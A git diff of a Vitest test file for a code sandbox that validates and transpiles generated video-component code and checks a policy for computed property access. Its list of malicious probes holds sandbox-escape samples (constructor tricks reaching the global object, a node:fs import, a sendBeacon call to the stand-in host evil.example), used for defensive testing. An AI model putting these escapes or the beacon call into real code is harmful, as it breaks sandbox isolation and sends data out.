@@ -3,11 +3,15 @@ import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { describe, expect, it, vi } from "vitest";
 import {
+  DYNAMIC_INDEX_VIOLATION_NAME,
   SANDBOX_ALLOWED_GLOBALS,
   validateGeneratedCode,
   type CodeViolation,
 } from "@/sandbox/code-validator";
-import { compileCode, transpileGeneratedCode } from "@/remotion/compiler";
+import {
+  transpileGeneratedCode,
+  evaluateTranspiled,
+} from "@/remotion/compiler";
 import {
   SANDBOX_CSP,
   buildSandboxFrameProps,
@@ -61,7 +65,7 @@ const MALICIOUS_PROBES: Array<[string, string, string]> = [
   ["import declaration", `import { readFileSync } from "node:fs";\nreturn null;`, "import"],
   ["with statement", `with (Math) { var x = floor(1.5); }\nreturn null;`, "with"],
   ["constructor escape", `const g = ({}).constructor.constructor("return this")(); return g;`, "constructor"],
-  ["computed constructor escape", `const o = {}; const k = "constructor"; return o[k]("return this")();`, "computed-access"],
+  ["computed constructor escape", `const o = {}; const k = "constructor"; return o[k]("return this")();`, DYNAMIC_INDEX_VIOLATION_NAME],
   ["global reassignment", `Math = null; return null;`, "Math"],
   ["globalThis access", `return globalThis.__pwned;`, "globalThis"],
   ["navigator.sendBeacon", `navigator.sendBeacon("https://evil.example", "x"); return null;`, "navigator"],
@@ -124,18 +128,41 @@ function label0(label: string): string {
 }
 
 describe("phase 4: compiler gate — malicious code never reaches execution", () => {
-  it("compileCode still compiles a benign component (renderer context, gated)", () => {
-    const result = compileCode(BENIGN);
-    expect(result.error).toBeNull();
-    expect(typeof result.Component).toBe("function");
+  it("compileCode is gone — the any-context evaluator no longer exists (phase 6)", async () => {
+    const compiler = (await import("@/remotion/compiler")) as unknown as Record<string, unknown>;
+    expect(compiler.compileCode).toBeUndefined();
+    expect(typeof compiler.evaluateTranspiled).toBe("function");
+    expect(typeof compiler.transpileGeneratedCode).toBe("function");
+  });
+
+  it("the sandbox data path survives the removal end-to-end", () => {
+    // parent: validate + transpile (pure data)
+    const prepared = transpileGeneratedCode(BENIGN);
+    expect(prepared.error).toBeNull();
+    // parent -> frame: a structured run message over postMessage
+    const message = parseSandboxMessage({
+      type: "fqmg-sandbox/run",
+      transpiled: prepared.transpiled,
+      width: 1920,
+      height: 1080,
+      fps: 30,
+      durationInFrames: 90,
+    });
+    expect(message?.type).toBe("fqmg-sandbox/run");
+    // frame: evaluation happens ONLY inside the sandbox realm
+    const evaluated = evaluateTranspiled(
+      (message as { transpiled: string }).transpiled,
+    );
+    expect(typeof evaluated).toBe("function");
   });
 
   it.each(MALICIOUS_PROBES.slice(0, 8))(
-    "compileCode refuses: %s",
+    "transpileGeneratedCode refuses: %s",
     (_label, code) => {
-      const result = compileCode(code);
-      expect(result.Component).toBeNull();
+      const result = transpileGeneratedCode(code);
+      expect(result.transpiled).toBeNull();
       expect(result.error).toMatch(/security policy|not allowed/i);
+      expect(result.violations?.length).toBeGreaterThan(0);
     },
   );
 
@@ -327,5 +354,59 @@ describe("phase 4: CSP wiring stays in sync (next.config.js header)", () => {
       expect(config, `missing CSP directive: ${directive}`).toContain(directive);
     }
     expect(config).toContain('source: "/preview-sandbox"');
+  });
+});
+
+describe("computed access policy: constant numeric indexing is code, runtime keys are not", () => {
+  it("accepts constant numeric indexing and arithmetic over numeric literals", () => {
+    const body = [
+      "const scenes = [1, 2, 3];",
+      "const frames = [10, 20, 30];",
+      "const pad = [1];",
+      "const sizes = [5, 6];",
+      "const first = scenes[0];",
+      "const second = frames[3 - 1];",
+      "const neg = pad[-1];",
+      "const scaled = sizes[2 * 2];",
+      "return { first, second, neg, scaled };",
+    ].join("\n");
+    const result = validateGeneratedCode(body);
+    expect(result.ok, JSON.stringify(result.violations)).toBe(true);
+  });
+
+  it("accepts quoted string properties that are not escape hatches", () => {
+    const decl = "const style = { width: 10 };";
+    expect(validateGeneratedCode(`${decl} const w = style["width"]; return w;`).ok).toBe(true);
+    expect(validateGeneratedCode(`${decl} const w = style[\`width\`]; return w;`).ok).toBe(true);
+  });
+
+  it("rejects runtime-computed keys with an actionable violation name", () => {
+    const result = validateGeneratedCode(
+      `const k = "width"; const w = style[k]; return w;`,
+    );
+    expect(result.ok).toBe(false);
+    expect(violationNames(result.violations)).toContain(
+      DYNAMIC_INDEX_VIOLATION_NAME,
+    );
+  });
+
+  it("rejects expressions the validator cannot prove numeric", () => {
+    for (const probe of [
+      `const l = arr[arr.length - 1]; return l;`,
+      `const v = list[pick()]; return v;`,
+      `const v = map[keyName]; return v;`,
+    ]) {
+      const result = validateGeneratedCode(probe);
+      expect(result.ok, probe).toBe(false);
+      expect(violationNames(result.violations)).toContain(
+        DYNAMIC_INDEX_VIOLATION_NAME,
+      );
+    }
+  });
+
+  it("still rejects quoted escape-hatch names", () => {
+    const result = validateGeneratedCode(`const g = o["constructor"]; return g;`);
+    expect(result.ok).toBe(false);
+    expect(violationNames(result.violations)).toContain("constructor");
   });
 });
